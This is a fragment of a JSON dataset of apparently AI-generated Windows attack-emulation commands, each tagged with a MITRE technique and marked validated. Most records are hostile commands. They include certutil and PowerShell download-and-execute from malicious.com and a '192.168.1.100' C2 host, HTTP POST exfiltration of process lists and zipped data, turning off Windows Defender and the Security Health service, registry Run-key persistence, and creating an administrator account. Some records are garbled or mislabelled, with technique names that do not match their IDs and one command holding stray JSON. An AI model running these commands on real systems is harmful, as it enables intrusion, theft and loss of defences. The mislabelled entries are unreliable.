      "agent_id": "06bfd229-fc25-49c3-a28f-bdcd2675b0c4",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "acf55dc8-bf55-438b-9fa7-27d36829e05d",
      "ttp_id": "unknown",
      "technique_id": "T1070",
      "technique_name": "File Deletion",
      "tactic": "execution",
      "platform": "windows",
      "command": "powershell -Command \"Remove-Item -Path 'C:\\\\Users\\\\Public\\\\test.txt' -Force -ErrorAction SilentlyContinue\"",
      "description": "Delete a file using PowerShell with force and error action silently continue options",
      "requires_admin": false,
      "safety_level": "high",
      "expected_behavior": "The file test.txt will be deleted from the Public directory",
      "source": "langchain",
      "generated_at": "2025-12-22T15:25:26.986833",
      "agent_id": "06bfd229-fc25-49c3-a28f-bdcd2675b0c4",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "bad10566-9b9f-4a0c-bdd4-78d5413e7a20",
      "ttp_id": "unknown",
      "technique_id": "T1070",
      "technique_name": "File Deletion",
      "tactic": "execution",
      "platform": "windows",
      "command": "powershell -Command \"[System.IO.File]::Delete('C:\\\\Users\\\\Public\\\\test.txt')\"",
      "description": "Delete a file using PowerShell with .NET framework",
      "requires_admin": false,
      "safety_level": "high",
      "expected_behavior": "The file test.txt will be deleted from the Public directory",
      "source": "langchain",
      "generated_at": "2025-12-22T15:25:26.986833",
      "agent_id": "06bfd229-fc25-49c3-a28f-bdcd2675b0c4",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "e9fddf61-cf9f-4ee7-98c5-3923f8c04238",
      "ttp_id": "unknown",
      "technique_id": "T1218",
      "technique_name": "Software Deployment Tools",
      "tactic": "execution",
      "platform": "windows",
      "command": "certutil.exe -urlcache -f http://example.com/benign.exe %TEMP%\\benign.exe",
      "description": "Downloads a file using certutil",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "Downloads a file to the temp directory",
      "source": "langchain",
      "generated_at": "2025-12-22T15:25:27.545951",
      "agent_id": "06bfd229-fc25-49c3-a28f-bdcd2675b0c4",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "50bff122-9233-42ee-8019-93a9669399c9",
      "ttp_id": "unknown",
      "technique_id": "T1218",
      "technique_name": "Software Deployment Tools",
      "tactic": "execution",
      "platform": "windows",
      "command": "powershell -Command \"Invoke-WebRequest -Uri http://example.com/benign.txt -OutFile %TEMP%\\benign.txt\"",
      "description": "Downloads a file using PowerShell",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "Downloads a file to the temp directory",
      "source": "langchain",
      "generated_at": "2025-12-22T15:25:27.545951",
      "agent_id": "06bfd229-fc25-49c3-a28f-bdcd2675b0c4",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "50dbc414-4b9d-4057-99f6-1ed6bb7ae8a1",
      "ttp_id": "unknown",
      "technique_id": "T1136",
      "technique_name": "Software Deployment Tools",
      "tactic": "execution",
      "platform": "windows",
      "command": "net.exe user /add testuser testpass",
      "description": "Creates a new user using net.exe",
      "requires_admin": true,
      "safety_level": "high",
      "expected_behavior": "Creates a new user with the given username and password",
      "source": "langchain",
      "generated_at": "2025-12-22T15:25:27.545951",
      "agent_id": "06bfd229-fc25-49c3-a28f-bdcd2675b0c4",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "2b5cfb7d-d88f-4a28-a166-efb9f60a4228",
      "ttp_id": "unknown",
      "technique_id": "T1071",
      "technique_name": "Application Layer Protocol",
      "tactic": "execution",
      "platform": "windows",
      "command": "powershell -Command \"Invoke-WebRequest -Uri 'http://example.com/test.txt' -OutFile '%TEMP%\\test.txt'\"",
      "description": "Downloads a file using HTTP protocol",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "Downloads a file from a specified URL and saves it to the temp directory",
      "source": "langchain",
      "generated_at": "2025-12-22T15:25:28.461241",
      "agent_id": "06bfd229-fc25-49c3-a28f-bdcd2675b0c4",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "76886d2e-f237-4a61-9df0-f8fdf6f7e8a2",
      "ttp_id": "unknown",
      "technique_id": "T1071",
      "technique_name": "Application Layer Protocol",
      "tactic": "execution",
      "platform": "windows",
      "command": "certutil -urlcache -f http://example.com/test.exe %TEMP%\\test.exe && %TEMP%\\test.exe",
      "description": "Downloads and executes a file using HTTP protocol",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "Downloads a file from a specified URL, saves it to the temp directory, and then executes it",
      "source": "langchain",
      "generated_at": "2025-12-22T15:25:28.461241",
      "agent_id": "06bfd229-fc25-49c3-a28f-bdcd2675b0c4",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "8f3af89d-95a4-42de-a1c8-4fcbbade5ffb",
      "ttp_id": "unknown",
      "technique_id": "T1071",
      "technique_name": "Application Layer Protocol",
      "tactic": "execution",
      "platform": "windows",
      "command": "powershell -Command \"[System.Net.WebRequest]::Create('http://example.com/test.txt').GetResponse()\"",
      "description": "Sends an HTTP request using the WebRequest class",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "Sends an HTTP request to a specified URL and retrieves the response",
      "source": "langchain",
      "generated_at": "2025-12-22T15:25:28.461241",
      "agent_id": "06bfd229-fc25-49c3-a28f-bdcd2675b0c4",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "51136376-e17f-4591-8086-bb2bb704fc08",
      "ttp_id": "unknown",
      "technique_id": "T1059",
      "technique_name": "Command and Scripting Interpreter",
      "tactic": "execution",
      "platform": "windows",
      "command": "cmd /c perlcritic.exe --help",
      "description": "Runs perlcritic.exe with the --help flag using the Windows Command Shell",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "The command will display the help menu for perlcritic.exe",
      "source": "langchain",
      "generated_at": "2025-12-22T15:25:29.290809",
      "agent_id": "06bfd229-fc25-49c3-a28f-bdcd2675b0c4",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "6eaaac1e-6fb8-4807-88b5-737962a4ab20",
      "ttp_id": "unknown",
      "technique_id": "T1059",
      "technique_name": "Command and Scripting Interpreter",
      "tactic": "execution",
      "platform": "windows",
      "command": "powershell -Command \"& {perlcritic.exe --help}\"",
      "description": "Runs perlcritic.exe with the --help flag using PowerShell",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "The command will display the help menu for perlcritic.exe",
      "source": "langchain",
      "generated_at": "2025-12-22T15:25:29.290809",
      "agent_id": "06bfd229-fc25-49c3-a28f-bdcd2675b0c4",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "1fdb264a-19d1-4ef1-86c2-60dc27a626cb",
      "ttp_id": "unknown",
      "technique_id": "T1059",
      "technique_name": "Command and Scripting Interpreter",
      "tactic": "execution",
      "platform": "windows",
      "command": "cmd /c perlcritic.exe -r .",
      "description": "Runs perlcritic.exe on the current directory using the Windows Command Shell",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "The command will run perlcritic.exe on the current directory and display the results",
      "source": "langchain",
      "generated_at": "2025-12-22T15:25:29.290809",
      "agent_id": "06bfd229-fc25-49c3-a28f-bdcd2675b0c4",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "400dbf5e-ddcf-4e8f-9cdf-9d591cb311d7",
      "ttp_id": "unknown",
      "technique_id": "T1068",
      "technique_name": "Exploitation for Privilege Escalation",
      "tactic": "execution",
      "platform": "windows",
      "command": "net localgroup administrators testuser /add",
      "description": "Exploitation for privilege escalation by adding a user to the administrators group",
      "requires_admin": true,
      "safety_level": "high",
      "expected_behavior": "The testuser is added to the administrators group",
      "source": "langchain",
      "generated_at": "2025-12-22T15:25:29.889870",
      "agent_id": "06bfd229-fc25-49c3-a28f-bdcd2675b0c4",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "9b26b11f-4300-44fd-8202-711785b945f3",
      "ttp_id": "unknown",
      "technique_id": "T1190",
      "technique_name": "Exploitation for Privilege Escalation",
      "tactic": "execution",
      "platform": "windows",
      "command": "powershell -Command \"Add-WindowsCapability -Name NetFx3~~~~ -Source C:\\\\\\\\temp\\\\\\\\NetFx3\\\\\\\\\\\", \"expected_behavior\": \"The .NET Framework 3 is installed from the local source\", \"safety_level\": \"medium\", \"requires_admin\": true, \"technique_id\": \"T1190\", \"description\": \"Exploitation for privilege escalation by installing a capability\", \"platform\": \"windows\"",
      "description": "Exploitation for privilege escalation by installing a capability",
      "requires_admin": true,
      "safety_level": "medium",
      "expected_behavior": "The .NET Framework 3 is installed from the local source",
      "source": "langchain",
      "generated_at": "2025-12-22T15:25:29.889870",
      "agent_id": "06bfd229-fc25-49c3-a28f-bdcd2675b0c4",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "0f4d89aa-0fad-4794-99ec-548156c94ebd",
      "ttp_id": "unknown",
      "technique_id": "T1190",
      "technique_name": "Exploitation for Privilege Escalation",
      "tactic": "execution",
      "platform": "windows",
      "command": "certutil -f -urlcache -split http://example.com/malicious.exe %TEMP%\\\\\\\\\\malicious.exe && %TEMP%\\\\\\\\\\malicious.exe",
      "description": "Exploitation for privilege escalation by downloading and executing a malicious executable",
      "requires_admin": false,
      "safety_level": "high",
      "expected_behavior": "The malicious executable is downloaded and executed",
      "source": "langchain",
      "generated_at": "2025-12-22T15:25:29.889870",
      "agent_id": "06bfd229-fc25-49c3-a28f-bdcd2675b0c4",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "64a7c168-4280-4f37-8303-bf885e3e450a",
      "ttp_id": "unknown",
      "technique_id": "T1018",
      "technique_name": "Network Service Discovery",
      "tactic": "execution",
      "platform": "windows",
      "command": "net view",
      "description": "Enumerate connected systems on the network using built-in net command",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "Lists available domains, computers, or shared resources on the network",
      "source": "langchain",
      "generated_at": "2025-12-22T15:25:32.036642",
      "agent_id": "06bfd229-fc25-49c3-a28f-bdcd2675b0c4",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "ce773a8c-450c-43e1-b777-8f773a8108e9",
      "ttp_id": "unknown",
      "technique_id": "T1018",
      "technique_name": "Network Service Discovery",
      "tactic": "execution",
      "platform": "windows",
      "command": "powershell -Command \"Get-CimInstance -ClassName Win32_NetworkAdapterConfiguration | Where-Object { $_.IPEnabled -eq $true } | Select-Object Description, IPAddress, IPSubnet, DefaultIPGateway\"",
      "description": "Retrieve detailed network configuration of the host using PowerShell CIM",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "Outputs network interface details including IP addresses, subnet masks, and default gateways",
      "source": "langchain",
      "generated_at": "2025-12-22T15:25:32.036642",
      "agent_id": "06bfd229-fc25-49c3-a28f-bdcd2675b0c4",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "13c4f67c-aabb-4d00-b456-63c56392e361",
      "ttp_id": "unknown",
      "technique_id": "T1018",
      "technique_name": "Network Service Discovery",
      "tactic": "execution",
      "platform": "windows",
      "command": "powershell -Command \"try { $web = [System.Net.WebClient]::new(); $web.Headers.Add('User-Agent', 'Mozilla/5.0'); $result = $web.DownloadString('http://169.254.169.254/latest/meta-data/'); if ($result) { Write-Output $result } } catch { } finally { if ($web) { $web.Dispose() } }\"",
      "description": "Attempt metadata service query for cloud environment discovery (benign if not in cloud)",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "Queries link-local metadata endpoint; typically fails silently in non-cloud environments",
      "source": "langchain",
      "generated_at": "2025-12-22T15:25:32.036642",
      "agent_id": "06bfd229-fc25-49c3-a28f-bdcd2675b0c4",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "516b8d5f-9119-4119-8bfb-e6bb62e1415c",
      "ttp_id": "unknown",
      "technique_id": "T1053.005",
      "technique_name": "Create or Modify System Process",
      "tactic": "execution",
      "platform": "windows",
      "command": "net.exe start \"Windows Update\"",
      "description": "Start an existing Windows service using built-in net.exe to simulate execution via service control",
      "requires_admin": true,
      "safety_level": "medium",
      "expected_behavior": "Attempts to start the Windows Update service; will fail if already running or if user lacks privileges",
      "source": "langchain",
      "generated_at": "2025-12-22T15:25:33.032842",
      "agent_id": "06bfd229-fc25-49c3-a28f-bdcd2675b0c4",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "bc4e9b15-0b8f-4451-8be4-6ac9fec90afe",
      "ttp_id": "unknown",
      "technique_id": "T1053.005",
      "technique_name": "Create or Modify System Process",
      "tactic": "execution",
      "platform": "windows",
      "command": "sc.exe create BadService binPath= \"cmd.exe /c echo test > %TEMP%\\svc.txt\" start= auto && sc.exe start BadService",
      "description": "Creates and starts a Windows service using built-in sc.exe with a benign command",
      "requires_admin": true,
      "safety_level": "high",
      "expected_behavior": "Creates a new service named 'BadService', sets it to run a benign command, and starts it; leaves artifacts requiring manual cleanup",
      "source": "langchain",
      "generated_at": "2025-12-22T15:25:33.032842",
      "agent_id": "06bfd229-fc25-49c3-a28f-bdcd2675b0c4",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "7a18e233-fa6c-4a47-b3c0-434a20cb27d5",
      "ttp_id": "unknown",
      "technique_id": "T1059.001",
      "technique_name": "Create or Modify System Process",
      "tactic": "execution",
      "platform": "windows",
      "command": "powershell -Command \"Start-Process -FilePath 'cmd.exe' -ArgumentList '/c', 'whoami' -WindowStyle Hidden\"",
      "description": "Executes a process via PowerShell Start-Process cmdlet with hidden window to simulate stealthy execution",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "Spawns a hidden cmd.exe process that runs 'whoami'; no output displayed in current console",
      "source": "langchain",
      "generated_at": "2025-12-22T15:25:33.032842",
      "agent_id": "06bfd229-fc25-49c3-a28f-bdcd2675b0c4",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "349b31b9-c4c0-4ffd-8d0d-f3c8a5f8c0f5",
      "ttp_id": "unknown",
      "technique_id": "T1562.001",
      "technique_name": "Impair Defenses",
      "tactic": "execution",
      "platform": "windows",
      "command": "sc stop \"SecurityHealthService\" && sc config \"SecurityHealthService\" start= disabled",
      "description": "Disables the Windows Security Service (SecurityHealthService) using built-in sc.exe to prevent security monitoring.",
      "requires_admin": true,
      "safety_level": "high",
      "expected_behavior": "Stops the Windows Security service and configures it to not start on boot. This will disable real-time protection features.",
      "source": "langchain",
      "generated_at": "2025-12-22T15:25:33.801964",
      "agent_id": "06bfd229-fc25-49c3-a28f-bdcd2675b0c4",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "8fe6b450-4a90-4f79-9e22-75ffc106a764",
      "ttp_id": "unknown",
      "technique_id": "T1562.001",
      "technique_name": "Impair Defenses",
      "tactic": "execution",
      "platform": "windows",
      "command": "powershell -Command \"Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue\"",
      "description": "Disables Windows Defender real-time monitoring using PowerShell cmdlet Set-MpPreference.",
      "requires_admin": true,
      "safety_level": "high",
      "expected_behavior": "Disables Windows Defender real-time monitoring if the system has Microsoft Defender enabled. No output on success.",
      "source": "langchain",
      "generated_at": "2025-12-22T15:25:33.801964",
      "agent_id": "06bfd229-fc25-49c3-a28f-bdcd2675b0c4",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "cd4fcccc-32a7-4487-82ac-bc21a9dcd275",
      "ttp_id": "unknown",
      "technique_id": "T1562.001",
      "technique_name": "Impair Defenses",
      "tactic": "execution",
      "platform": "windows",
      "command": "reg add \"HKLM\\SYSTEM\\CurrentControlSet\\Services\\SecurityHealthService\" /v Start /t REG_DWORD /d 4 /f",
      "description": "Modifies the registry to disable the Security Health Service by setting its startup type to Disabled (4).",
      "requires_admin": true,
      "safety_level": "high",
      "expected_behavior": "Adds a registry value to disable the SecurityHealthService from starting automatically. Takes effect after reboot or when service is next queried.",
      "source": "langchain",
      "generated_at": "2025-12-22T15:25:33.801964",
      "agent_id": "06bfd229-fc25-49c3-a28f-bdcd2675b0c4",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "944ade3f-27ce-4384-a788-51cb76fa3b41",
      "ttp_id": "unknown",
      "technique_id": "T1055",
      "technique_name": "Process Injection",
      "tactic": "execution",
      "platform": "windows",
      "command": "rundll32.exe kernel32.dll,CreateRemoteThread",
      "description": "Basic process injection attempt using rundll32 with CreateRemoteThread API call",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "Attempts to invoke CreateRemoteThread via rundll32, which may fail due to incorrect usage but simulates injection attempts",
      "source": "langchain",
      "generated_at": "2025-12-22T15:25:34.666854",
      "agent_id": "06bfd229-fc25-49c3-a28f-bdcd2675b0c4",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "85bff932-2a9c-470f-a8a3-ed3e33d090c3",
      "ttp_id": "unknown",
      "technique_id": "T1055",
      "technique_name": "Process Injection",
      "tactic": "execution",
      "platform": "windows",
      "command": "powershell -Command \"Start-Process notepad.exe -WindowStyle Hidden; $proc = Get-Process notepad; $addr = [System.Diagnostics.Process]::GetCurrentProcess().Handle; $remote = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((Add-WindowsCapability -Online -Name OpenSSH.Client~~~~0.0.1.0), [Type]);\"",
      "description": "Intermediate attempt to simulate process injection using PowerShell reflection and memory manipulation",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "Starts notepad.exe hidden, then attempts (and fails) to perform reflective loading, simulating injection behavior without actual payload",
      "source": "langchain",
      "generated_at": "2025-12-22T15:25:34.666854",
      "agent_id": "06bfd229-fc25-49c3-a28f-bdcd2675b0c4",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "7b709ad3-6878-4267-84c5-8689fda25425",
      "ttp_id": "unknown",
      "technique_id": "T1055",
      "technique_name": "Process Injection",
      "tactic": "execution",
      "platform": "windows",
      "command": "powershell -Command \"[Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes('Write-Output \\\"Simulated injection via encoded command\\\"')) | Out-File -Force $env:TEMP\\inject.txt\"",
      "description": "Advanced simulation using PowerShell encoded command generation for injection scenarios",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "Generates a UTF-16LE Base64-encoded string of a benign command and saves it to a temp file, mimicking how encoded injection commands are staged",
      "source": "langchain",
      "generated_at": "2025-12-22T15:25:34.666854",
      "agent_id": "06bfd229-fc25-49c3-a28f-bdcd2675b0c4",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "31b979e8-afce-44df-849b-1634c0095af9",
      "ttp_id": "unknown",
      "technique_id": "T1071.001",
      "technique_name": "Application Layer Protocol",
      "tactic": "execution",
      "platform": "windows",
      "command": "certutil.exe -urlcache -split -f http://malicious.com/payload.exe %TEMP%\\\\payload.exe && %TEMP%\\\\payload.exe",
      "description": "Download and execute a payload using certutil, a built-in Windows binary commonly abused for exfiltration or C2 communication over HTTP.",
      "requires_admin": false,
      "safety_level": "high",
      "expected_behavior": "Attempts to download a file from a remote server to the temp directory and executes it. Network connection and file creation in %TEMP% may occur if the server is reachable.",
      "source": "langchain",
      "generated_at": "2025-12-22T15:25:35.633430",
      "agent_id": "06bfd229-fc25-49c3-a28f-bdcd2675b0c4",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "c414cd73-48ff-4197-a329-e0cc00374903",
      "ttp_id": "unknown",
      "technique_id": "T1071.001",
      "technique_name": "Application Layer Protocol",
      "tactic": "execution",
      "platform": "windows",
      "command": "powershell -Command \"IWR -Uri http://malicious.com/data -Method POST -Body (Get-Process | ConvertTo-Json) -ErrorAction SilentlyContinue\"",
      "description": "Exfiltrate process list via HTTP POST using PowerShell Invoke-WebRequest (IWR) to simulate data exfiltration over C2 channel.",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "Sends a JSON-encoded list of running processes to a remote endpoint via HTTP POST. No file is written to disk. Fails silently if network is unreachable.",
      "source": "langchain",
      "generated_at": "2025-12-22T15:25:35.633430",
      "agent_id": "06bfd229-fc25-49c3-a28f-bdcd2675b0c4",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "97de3eda-0279-45f4-85b2-fc5824dac4c4",
      "ttp_id": "unknown",
      "technique_id": "T1071.001",
      "technique_name": "Application Layer Protocol",
      "tactic": "execution",
      "platform": "windows",
      "command": "powershell -Command \"Compress-Archive -Path %TEMP%\\\\sensitive_data -DestinationPath %TEMP%\\\\archive.zip -Force; Remove-Item %TEMP%\\\\sensitive_data -Recurse -ErrorAction SilentlyContinue; IWR -Uri http://malicious.com/upload -InFile %TEMP%\\\\archive.zip -Method POST\"",
      "description": "Archive collected data and exfiltrate via HTTP POST using built-in PowerShell cmdlets, simulating multi-stage exfiltration behavior.",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "Creates a ZIP archive of a folder named 'sensitive_data' in %TEMP%, deletes the original folder, and attempts to upload the archive via HTTP POST. Uses -Force and -ErrorAction for robustness.",
      "source": "langchain",
      "generated_at": "2025-12-22T15:25:35.633430",
      "agent_id": "06bfd229-fc25-49c3-a28f-bdcd2675b0c4",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "954c9a8c-aea2-405c-8247-01282f9aa4d4",
      "ttp_id": "unknown",
      "technique_id": "T1059.003",
      "technique_name": "Command and Scripting Interpreter",
      "tactic": "execution",
      "platform": "windows",
      "command": "cmd.exe /c echo \"Hello from cmd\" && whoami && ipconfig",
      "description": "Basic command execution using built-in Windows cmd.exe to run simple system commands.",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "Executes three sequential commands: prints a test message, displays current user context, and shows network configuration. Uses only built-in Windows binaries.",
      "source": "langchain",
      "generated_at": "2025-12-22T15:25:36.588830",
      "agent_id": "06bfd229-fc25-49c3-a28f-bdcd2675b0c4",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "e5345fe3-0d65-467b-b28d-53656d241b67",
      "ttp_id": "unknown",
      "technique_id": "T1105",
      "technique_name": "Command and Scripting Interpreter",
      "tactic": "execution",
      "platform": "windows",
      "command": "certutil.exe -urlcache -split -f http://127.0.0.1:8080/stage1.exe %TEMP%\\\\stage1.exe && %TEMP%\\\\stage1.exe",
      "description": "Intermediate command using certutil.exe to download and execute a staged payload from a local server.",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "Attempts to download a file from a local HTTP server using certutil (commonly abused for exfiltration or staging). If the server is unreachable, it fails silently. Then executes the downloaded binary from %TEMP%. No actual payload is transferred in testing.",
      "source": "langchain",
      "generated_at": "2025-12-22T15:25:36.588830",
      "agent_id": "06bfd229-fc25-49c3-a28f-bdcd2675b0c4",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "d19ce201-0f3b-4ac3-8400-f55533591936",
      "ttp_id": "unknown",
      "technique_id": "T1059.001",
      "technique_name": "Command and Scripting Interpreter",
      "tactic": "execution",
      "platform": "windows",
      "command": "powershell -Command \"try { $webRequest = [System.Net.WebRequest]::Create('http://127.0.0.1:8080/payload.txt'); $response = $webRequest.GetResponse(); $stream = $response.GetResponseStream(); $reader = New-Object System.IO.StreamReader($stream); $content = $reader.ReadToEnd(); Invoke-Expression $content; } catch { } \"",
      "description": "Advanced PowerShell-based command execution via remote script download and in-memory execution.",
      "requires_admin": false,
      "safety_level": "high",
      "expected_behavior": "Attempts to download a script from a local HTTP server and execute it directly in memory using Invoke-Expression. Fails silently if the server is down. No disk writing occurs, making it stealthier. Uses only built-in .NET classes and PowerShell.",
      "source": "langchain",
      "generated_at": "2025-12-22T15:25:36.588830",
      "agent_id": "06bfd229-fc25-49c3-a28f-bdcd2675b0c4",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "e4d28756-6c9f-4614-af2d-bfb09ef523e8",
      "ttp_id": "unknown",
      "technique_id": "T1105",
      "technique_name": "Command and Control",
      "tactic": "execution",
      "platform": "windows",
      "command": "certutil.exe -urlcache -split -f http://192.168.1.100:8080/stage1.exe %TEMP%\\\\stage1.exe && %TEMP%\\\\stage1.exe",
      "description": "Download payload from C2 server using certutil and execute it from temp directory",
      "requires_admin": false,
      "safety_level": "high",
      "expected_behavior": "Attempts to download executable from specified URL and runs it from the local temp folder. Leaves disk artifacts and generates HTTP(S) traffic to attacker-controlled server.",
      "source": "langchain",
      "generated_at": "2025-12-22T15:25:37.680813",
      "agent_id": "06bfd229-fc25-49c3-a28f-bdcd2675b0c4",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "89c0281d-4167-4798-aef8-b8ed6a56a691",
      "ttp_id": "unknown",
      "technique_id": "T1071.001",
      "technique_name": "Command and Control",
      "tactic": "execution",
      "platform": "windows",
      "command": "powershell -Command \"IWR -Uri http://192.168.1.100:8080/task -UseBasicParsing | Invoke-Expression\"",
      "description": "Fetch and execute remote PowerShell script over HTTP using Invoke-WebRequest and Invoke-Expression",
      "requires_admin": false,
      "safety_level": "high",
      "expected_behavior": "Sends HTTP GET request to C2 server to retrieve command or script, then executes it in-memory without writing to disk. Harder to detect via file scanning but visible in network logs.",
      "source": "langchain",
      "generated_at": "2025-12-22T15:25:37.681322",
      "agent_id": "06bfd229-fc25-49c3-a28f-bdcd2675b0c4",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "eed30f63-157f-48fa-a55d-71e475981793",
      "ttp_id": "unknown",
      "technique_id": "T1547.001",
      "technique_name": "Command and Control",
      "tactic": "execution",
      "platform": "windows",
      "command": "reg add HKLM\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run /v UpdateSvc /t REG_SZ /d \"cmd /c start %TEMP%\\\\stage1.exe\" /f && certutil.exe -urlcache -split -f http://192.168.1.100:8080/stage1.exe %TEMP%\\\\stage1.exe",
      "description": "Establish persistence via registry run key after downloading payload with certutil",
      "requires_admin": true,
      "safety_level": "high",
      "expected_behavior": "Downloads payload to temp directory, then adds a registry entry to execute it at user login. Requires admin privileges for HKLM modification. Provides persistence across reboots.",
      "source": "langchain",
      "generated_at": "2025-12-22T15:25:37.681322",
      "agent_id": "06bfd229-fc25-49c3-a28f-bdcd2675b0c4",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "e0e970c0-48dd-487c-b3b5-c084b1932dd9",
      "ttp_id": "unknown",
      "technique_id": "T1105",
      "technique_name": "Exploit Public-Facing Application",
      "tactic": "execution",
      "platform": "windows",
      "command": "certutil.exe -urlcache -split -f http://192.168.1.100/shell.exe %TEMP%\\\\shell.exe && %TEMP%\\\\shell.exe",
      "description": "Download and execute a payload from a remote server using certutil, a built-in Windows utility often abused for file transfer.",
      "requires_admin": false,
      "safety_level": "high",
      "expected_behavior": "Attempts to download an executable from a specified URL to the TEMP directory and executes it. Fails silently if network is unreachable or file is blocked.",
      "source": "langchain",
      "generated_at": "2025-12-22T15:25:38.872429",
      "agent_id": "06bfd229-fc25-49c3-a28f-bdcd2675b0c4",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "e6b91e8b-6351-4d8d-aa6e-bcc8d788cda5",
      "ttp_id": "unknown",
      "technique_id": "T1105",
      "technique_name": "Exploit Public-Facing Application",
      "tactic": "execution",
      "platform": "windows",
      "command": "powershell -Command \"Invoke-WebRequest -Uri 'http://192.168.1.100/payload.txt' -OutFile '$env:TEMP\\\\data.txt' -ErrorAction SilentlyContinue; Compress-Archive -Path '$env:TEMP\\\\data.txt' -DestinationPath '$env:TEMP\\\\archive.zip' -Force\"",
      "description": "Fetch a file via PowerShell, then compress it into an archive to simulate data staging before exfiltration.",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "Downloads a text file from a local server and creates a ZIP archive of it. Uses error suppression and force overwrite for robustness.",
      "source": "langchain",
      "generated_at": "2025-12-22T15:25:38.872429",
      "agent_id": "06bfd229-fc25-49c3-a28f-bdcd2675b0c4",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "2b2a978e-e08b-43b2-8964-29229ae5977c",
      "ttp_id": "unknown",
      "technique_id": "T1203",
      "technique_name": "Exploit Public-Facing Application",
      "tactic": "execution",
      "platform": "windows",
      "command": "powershell -Command \"Write-Output 'Simulated exploit output' | Out-File -FilePath '$env:TEMP\\\\exploit_log.txt'; Start-Process -FilePath 'cmd.exe' -ArgumentList '/c', 'type', '$env:TEMP\\\\exploit_log.txt' -Verb RunAs\"",
      "description": "Simulate exploitation of a public-facing application by writing a benign log file and attempting to escalate privileges using RunAs.",
      "requires_admin": true,
      "safety_level": "medium",
      "expected_behavior": "Creates a simulated exploit log file and attempts to open it with elevated privileges via UAC prompt. Execution may stall if user denies elevation.",
      "source": "langchain",
      "generated_at": "2025-12-22T15:25:38.872429",
      "agent_id": "06bfd229-fc25-49c3-a28f-bdcd2675b0c4",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "698fab43-b155-4956-8d95-18b5eba6090a",
      "ttp_id": "unknown",
      "technique_id": "T1046",
      "technique_name": "Network Service Discovery",
      "tactic": "execution",
      "platform": "windows",
      "command": "net view \\\\localhost",
      "description": "Performs local network service discovery by querying shared resources on the local machine using the legacy net.exe binary.",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "Lists shared resources on the local system. Will output error if Server service is not running, but is otherwise safe.",
      "source": "langchain",
      "generated_at": "2025-12-22T15:25:39.828071",
      "agent_id": "06bfd229-fc25-49c3-a28f-bdcd2675b0c4",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "b4e86fbd-b30b-4276-aac1-6ad8a2b079a4",
      "ttp_id": "unknown",
      "technique_id": "T1046",
      "technique_name": "Network Service Discovery",
      "tactic": "execution",
      "platform": "windows",
